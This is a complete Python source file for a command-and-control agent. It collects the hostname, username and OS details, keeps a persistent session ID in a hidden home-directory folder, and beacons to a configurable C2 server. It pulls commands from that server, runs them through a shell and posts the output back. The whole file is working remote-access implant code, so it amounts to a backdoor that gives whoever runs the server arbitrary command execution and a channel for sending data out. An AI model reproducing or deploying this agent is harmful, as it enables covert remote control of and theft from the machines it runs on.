import requests
import json
import time
import platform
import subprocess
import os
import uuid
import sys

# --- Agent Configuration ---
# IMPORTANT: Replace with the actual IP and port of your C2 server's HTTP listener
C2_SERVER_URL = "http://127.0.0.1:8080" # Change to your C2 server's public IP if testing externally!
BEACON_INTERVAL = 5 # Seconds between beacons

# Define paths for agent configuration/persistence
AGENT_CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".c2_agent")
AGENT_CONFIG_FILE = os.path.join(AGENT_CONFIG_DIR, "config.json")
# --- End Agent Configuration ---

def get_agent_info():
    """Gathers basic system information for registration."""
    hostname = platform.node()
    username = os.getlogin() if hasattr(os, 'getlogin') else os.getenv('USER') or os.getenv('USERNAME')
    os_info = platform.system() + " " + platform.release() + " " + platform.architecture()[0]
    return f"{hostname}|{username}|{os_info}"

def load_or_generate_session_id():
    """Loads a persistent session ID or generates a new one."""
    os.makedirs(AGENT_CONFIG_DIR, exist_ok=True)
    if os.path.exists(AGENT_CONFIG_FILE):
        try:
            with open(AGENT_CONFIG_FILE, 'r') as f:
                config = json.load(f)
                session_id = config.get('session_id')
                if session_id:
                    print(f"[+] Loaded existing session ID: {session_id}")
                    return session_id
        except json.JSONDecodeError:
            print("[!] Corrupted config.json, generating new session ID.")
    
    session_id = str(uuid.uuid4())
    with open(AGENT_CONFIG_FILE, 'w') as f:
        json.dump({'session_id': session_id}, f)
    print(f"[+] Generated new session ID: {session_id}")
    return session_id

def beacon(session_id, agent_info):
    """Sends a beacon to the C2 server, registering if needed."""
    try:
        url = f"{C2_SERVER_URL}/beacon"
        params = {
            "session_id": session_id,
            "info": agent_info
        }
        # Using requests.get with params automatically handles URL encoding
        response = requests.get(url, params=params, timeout=BEACON_INTERVAL - 1)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        print(f"[+] Beaconed successfully. Response: {response.text}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Beacon failed: {e}")
        return False

def get_tasks(session_id):
    """Requests pending tasks from the C2 server."""
    try:
        url = f"{C2_SERVER_URL}/tasks"
        params = {"session_id": session_id}
        response = requests.get(url, params=params, timeout=BEACON_INTERVAL - 1)
        response.raise_for_status()
        task_data = response.json()
        if task_data.get("command") == "noop":
            print("[+] No pending tasks.")
            return None
        print(f"[+] Received task: {task_data.get('command')} (Task ID: {task_data.get('task_id')})")
        return task_data
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to retrieve tasks: {e}")
        return None
    except json.JSONDecodeError:
        print(f"[-] Failed to decode task response JSON: {response.text}")
        return None

def execute_command(command):
    """Executes a system command and returns its output."""
    try:
        # Use shell=True for simple commands; for more security, parse commands directly
        # capture_output=True captures stdout/stderr. text=True decodes as string.
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = result.stdout + result.stderr
        return output.strip() or "[No output]" # Return a placeholder if command yields no output
    except subprocess.TimeoutExpired:
        print(f"[-] Command '{command}' timed out.")
        return f"[Command timed out: {command}]"
    except FileNotFoundError:
        return f"[Error: Command not found: {command}]"
    except Exception as e:
        return f"[Error executing command '{command}': {e}]"

def send_output(session_id, task_id, output):
    """Sends command output back to the C2 server."""
    try:
        url = f"{C2_SERVER_URL}/output"
        payload = {
            "session_id": session_id,
            "task_id": task_id,
            "output": output
        }
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=payload, headers=headers, timeout=BEACON_INTERVAL - 1)
        response.raise_for_status()
        print(f"[+] Output for task {task_id} sent successfully. Response: {response.text}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to send output for task {task_id}: {e}")
        return False

def main():
    session_id = load_or_generate_session_id()
    agent_info = get_agent_info()
    print(f"[*] Agent started. Session ID: {session_id}")
    print(f"[*] Agent Info: {agent_info}")
    print(f"[*] Beaconing to: {C2_SERVER_URL} every {BEACON_INTERVAL} seconds.")

    while True:
        try:
            # 1. Beacon
            print(f"\n[*] Beaconing...")
            if not beacon(session_id, agent_info):
                print("[-] Beacon failed. Retrying...")
                time.sleep(BEACON_INTERVAL)
                continue

            # 2. Get Tasks
            print("[*] Requesting tasks...")
            task = get_tasks(session_id)

            if task and task.get("command") != "noop":
                command_to_execute = task.get("command")
                task_id = task.get("task_id")
                print(f"[*] Executing command: {command_to_execute}")
                command_output = execute_command(command_to_execute)
                print(f"[+] Command output:\n{command_output[:200]}...") # Print first 200 chars

                # 3. Send Output
                print(f"[*] Sending output for task {task_id}...")
                send_output(session_id, task_id, command_output)

            # 4. Sleep
            time.sleep(BEACON_INTERVAL)

        except KeyboardInterrupt:
            print("\n[!] Agent stopped by user.")
            break
        except Exception as e:
            print(f"[!] An unexpected error occurred in agent main loop: {e}", file=sys.stderr)
            time.sleep(BEACON_INTERVAL) # Wait before retrying


if __name__ == "__main__":
    main()